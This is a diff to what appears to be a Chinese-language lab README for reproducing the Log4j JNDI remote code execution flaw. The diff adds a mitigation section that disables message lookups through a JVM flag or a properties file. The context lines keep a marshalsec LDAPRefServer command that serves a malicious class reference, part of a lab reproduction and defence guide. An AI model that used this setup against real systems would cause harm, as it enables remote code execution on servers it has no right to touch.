@@ -13,3 +13,11 @@ jdk 1.8
 `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"` 
 
 execute log4j.java
+
+### 修复方案：
+
+（1）修改jvm参数
+-Dlog4j2.formatMsgNoLookups=true
+
+（2）修改配置
+在应用classpath下添加log4j2.component.properties配置文件，log4j2.formatMsgNoLookups=true
